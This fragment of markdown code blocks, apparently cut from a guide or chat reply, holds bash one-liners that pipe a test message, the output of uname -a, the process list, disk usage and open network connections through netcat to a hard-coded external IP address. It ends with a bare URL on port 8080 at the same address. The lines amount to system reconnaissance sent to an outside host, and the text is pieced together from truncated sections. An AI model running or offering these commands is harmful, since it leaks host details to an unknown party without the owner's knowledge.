...
```bash
# Simple test
echo "Test log entry $(date)" | nc 37.114.37.245 99

# Multiple lines
cat <<EOF | nc 37.114.37.245 99
...
```bash
# Quick test
echo "Test $(date)" | nc 37.114.37.245 99

# System info
uname -a | nc 37.114.37.245 99

# Process list (first 10)
ps aux | head -10 | nc 37.114.37.245 99

# Disk usage
df -h | nc 37.114.37.245 99

# Network connections
netstat -tuln | head -10 | nc 37.114.37.245 99
```
...
```
http://37.114.37.245:8080/XyT12AbC
```
